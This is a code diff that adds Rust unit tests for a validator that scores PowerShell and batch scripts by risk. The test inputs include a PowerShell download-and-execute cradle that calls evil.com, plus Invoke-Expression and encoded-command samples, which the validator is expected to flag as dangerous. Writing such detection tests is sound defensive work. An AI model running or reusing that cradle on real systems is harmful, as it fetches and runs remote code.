@@ -95,3 +95,54 @@ pub fn validate_script(code: String, language: String) -> ValidationResult {
         line_count: lines.len(),
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn safe_script_returns_safe() {
+        let r = validate_script("Get-Process | Select-Object Name, CPU".into(), "powershell".into());
+        assert_eq!(r.risk_level, "safe");
+        assert!(r.warnings.is_empty());
+    }
+
+    #[test]
+    fn danger_pattern_detected() {
+        let r = validate_script("Invoke-Expression $code".into(), "powershell".into());
+        assert_eq!(r.risk_level, "danger");
+        assert!(r.warnings.iter().any(|w| w.contains("DANGER")));
+    }
+
+    #[test]
+    fn download_string_is_danger() {
+        let r = validate_script("iex (New-Object Net.WebClient).downloadstring('http://evil.com/x.ps1')".into(), "ps1".into());
+        assert_eq!(r.risk_level, "danger");
+    }
+
+    #[test]
+    fn encoded_command_is_danger() {
+        let r = validate_script("powershell -EncodedCommand aGVsbG8=".into(), "batch".into());
+        assert_eq!(r.risk_level, "danger");
+    }
+
+    #[test]
+    fn stop_service_is_warning_not_danger() {
+        let r = validate_script("Stop-Service -Name spooler".into(), "powershell".into());
+        assert_eq!(r.risk_level, "warning");
+        assert!(r.warnings.iter().any(|w| w.starts_with("Attention:")));
+    }
+
+    #[test]
+    fn line_count_matches() {
+        let script = "line1\nline2\nline3";
+        let r = validate_script(script.into(), "powershell".into());
+        assert_eq!(r.line_count, 3);
+    }
+
+    #[test]
+    fn error_handling_detected_as_info() {
+        let r = validate_script("try { Get-Service } catch { }".into(), "powershell".into());
+        assert!(r.info.iter().any(|i| i.contains("Gestion d'erreur")));
+    }
+}
